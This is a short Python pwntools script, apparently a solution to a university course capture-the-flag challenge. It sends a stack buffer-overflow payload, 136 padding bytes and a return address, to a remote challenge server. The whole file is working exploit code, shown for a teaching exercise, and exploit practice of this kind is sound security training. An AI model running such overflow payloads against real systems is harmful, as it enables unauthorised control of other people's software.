import subprocess
from pwn import *

server = "cs2107-ctfd-i.comp.nus.edu.sg"
port = 5001

length = 136


input_data = b'A'*length
input_data += p64(0x00401209) # So this is 8 bytes
input_data += b'\n'

r = remote(server, port)
for i in range(3):
	print(r.recvline().decode().strip())
r.send(input_data)
print(r.recvall().decode())
